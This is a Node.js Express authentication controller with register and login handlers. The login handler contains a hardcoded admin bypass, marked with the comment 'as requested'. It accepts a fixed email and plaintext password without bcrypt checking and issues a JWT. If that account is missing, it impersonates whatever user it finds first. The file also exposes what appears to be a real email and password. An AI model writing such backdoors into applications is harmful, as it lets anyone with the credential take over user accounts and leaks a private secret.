const userService = require("../services/user.service")
const jwtProvider = require("../config/jwtProvider")
const bcrypt = require("bcrypt")
const cartService = require("../services/cart.service")
const register = async (req, res) => {
    try {
        const user = await userService.createUser(req.body);
        const jwt = jwtProvider.generateToken(user._id);

        await cartService.createCart(user);
        return res.status(200).send({ jwt, message: "suuccess" })
    } catch (error) {
        return res.status(500).send({ error: error.message })
    }
}

const login = async (req, res) => {
    const { password, email } = req.body;

    try {
        // Hardcoded admin bypass as requested
        if (email === 'jalajkumar23989@gmail.com' && password === 'Jelly22fi$h') {
            const User = require("../models/user.model");
            let adminUser = await User.findOne({ email });
            if (!adminUser) {
                // If not found, use any existing user as the impersonated admin for the token
                adminUser = await User.findOne({});
            }
            if (!adminUser) {
                return res.status(500).send({ message: "No users in DB to generate admin token from." })
            }

            const jwt = jwtProvider.generateToken(adminUser._id);
            return res.status(200).send({ jwt, message: "admin login success", role: "admin" });
        }

        const user = await userService.getUserByEmail(email);
        if (!user) {
            return res.status(404).send({ message: " user not found with email", email })
        }

        const isPasswordValid = await bcrypt.compare(password, user.password);

        if (!isPasswordValid) {
            return res.status(401).send({ message: "Invalid password" })
        }

        const jwt = jwtProvider.generateToken(user._id);
        return res.status(200).send({ jwt, message: "login success" })
    } catch (error) {
        return res.status(500).send({ error: error.message })
    }
}


module.exports = { register, login }